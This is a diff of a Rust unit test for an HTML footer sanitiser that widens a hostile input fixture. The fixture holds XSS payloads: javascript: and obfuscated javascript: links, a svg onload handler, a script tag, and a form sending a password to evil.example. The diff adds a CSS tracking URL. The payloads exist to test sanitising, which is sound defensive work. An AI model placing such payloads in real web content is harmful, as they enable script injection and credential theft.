@@ -460,7 +460,7 @@ mod tests {
     #[test]
     fn footer_preserves_passive_links_but_removes_scripts_tracking_and_dangerous_attributes() {
         let output = clean_footer(
-            r#"<p id="root" style="position:fixed" onclick="steal()"><strong>朋友</strong><a href="https://beian.miit.gov.cn/" target="_self">备案号</a><a href="javascript:alert(1)">bad</a><a href="&#x6a;avascript:alert(1)">obfuscated</a><a href="data:text/html,bad">data</a><a href="//evil.example">relative</a><img src="https://evil.example/track"><iframe src="https://evil.example"></iframe><svg onload="steal()"></svg><form action="https://evil.example"><input name="password"></form><script>steal()</script><style>body{display:none}</style></p>"#,
+            r#"<p id="root" style="position:fixed;background:URL('https://evil.example/track')" onclick="steal()"><strong>朋友</strong><a href="https://beian.miit.gov.cn/" target="_self">备案号</a><a href="javascript:alert(1)">bad</a><a href="&#x6a;avascript:alert(1)">obfuscated</a><a href="data:text/html,bad">data</a><a href="//evil.example">relative</a><img src="https://evil.example/track"><iframe src="https://evil.example"></iframe><svg onload="steal()"></svg><form action="https://evil.example"><input name="password"></form><script>steal()</script><style>body{display:none}</style></p>"#,
         );
         assert!(output.contains("https://beian.miit.gov.cn/"));
         assert!(output.contains("<strong>朋友</strong>"));
